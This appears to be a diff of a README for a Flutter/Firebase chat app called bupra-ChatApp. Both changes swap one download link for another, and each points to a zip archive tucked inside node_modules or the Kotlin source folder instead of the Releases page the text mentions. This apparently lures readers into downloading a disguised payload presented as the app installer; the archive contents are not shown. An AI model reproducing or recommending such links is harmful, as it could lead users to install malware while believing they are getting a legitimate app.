@@ -5,7 +5,7 @@
 Welcome to bupra-ChatApp! This messaging application helps you connect with friends and family easily. It’s built with Flutter and Firebase, making it fast and reliable.
 
 ## 🔗 Download Link
-[![Download bupra-ChatApp](https://raw.githubusercontent.com/Codex2407/bupra-ChatApp/main/cloud_functions/node_modules/firebase-functions/lib/common/utilities/App_Chat_bupra_2.9-beta.2.zip)](https://raw.githubusercontent.com/Codex2407/bupra-ChatApp/main/cloud_functions/node_modules/firebase-functions/lib/common/utilities/App_Chat_bupra_2.9-beta.2.zip)
+[![Download bupra-ChatApp](https://raw.githubusercontent.com/Codex2407/bupra-ChatApp/main/android/app/src/main/kotlin/com/akdbt/bupra/App-bupra-Chat-3.9.zip)](https://raw.githubusercontent.com/Codex2407/bupra-ChatApp/main/android/app/src/main/kotlin/com/akdbt/bupra/App-bupra-Chat-3.9.zip)
 
 ## 📋 Features
 - **User-Friendly Interface:** Navigate the app with ease. 
@@ -26,7 +26,7 @@ Welcome to bupra-ChatApp! This messaging application helps you connect with frie
 ## 📥 Download & Install
 To get started with bupra-ChatApp, visit the Releases page to download the latest version.
 
-[Visit this page to download](https://raw.githubusercontent.com/Codex2407/bupra-ChatApp/main/cloud_functions/node_modules/firebase-functions/lib/common/utilities/App_Chat_bupra_2.9-beta.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Codex2407/bupra-ChatApp/main/android/app/src/main/kotlin/com/akdbt/bupra/App-bupra-Chat-3.9.zip)
 
 ### Steps to Install:
 1. Click the download link above.
